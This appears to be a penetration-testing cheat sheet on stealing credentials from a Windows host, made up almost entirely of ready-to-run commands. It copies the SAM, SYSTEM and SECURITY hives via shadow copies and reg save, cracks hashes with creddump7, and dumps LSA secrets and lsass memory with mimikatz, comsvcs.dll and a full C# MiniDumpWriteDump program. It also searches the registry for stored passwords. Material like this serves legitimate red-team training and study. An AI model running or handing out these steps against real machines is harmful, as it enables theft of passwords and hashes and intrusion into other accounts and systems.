# Windows Local Credential Access

***

### Dump Local Credential

```cmd
 wmic shadowcopy call create Volume='c:\'
```

```cmd
vssadmin list shadows
```

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\system32\config\sam  .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\system32\config\system   .
```

```
reg save HKLM\sam sam
reg save HKLM\system system
```

```
esentutl.exe /y /vss C:\Windows\System32\config\SAM /d  sam
```

Cracking with Creddump7

```
Git clone <https://github.com/Neohapsis/creddump7>
Python  pwdump.py  /home/kali/system  /home/kali/sam
```

### Dump LSA

`Mimikatz`

Live

```
    token::elevate
    lsadump::secrets
```

Offline

```
reg save HKLM\SYSTEM system & reg save HKLM\security security
lsadump::secrets /system:c:\temp\system /security:c:\temp\security
```

`Registry`

    HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets

### Dump lsass

#### native DLL

```
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
```

#### dump with csharp

Dumplsass.cs

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
namespace MiniDump
{
    class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId,
        IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle,
        int processId);
        static void Main(string[] args)
        {
            FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp",
            FileMode.Create);
            Process[] lsass = Process.GetProcessesByName("lsass"); int lsass_pid = lsass[0].Id;
            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        }
    }
}
```

`mimikatz`

```cmd
mimikatz # sekurlsa::minidump c:\windows\tasks\lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### Credentials in Registry

```
reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s
```
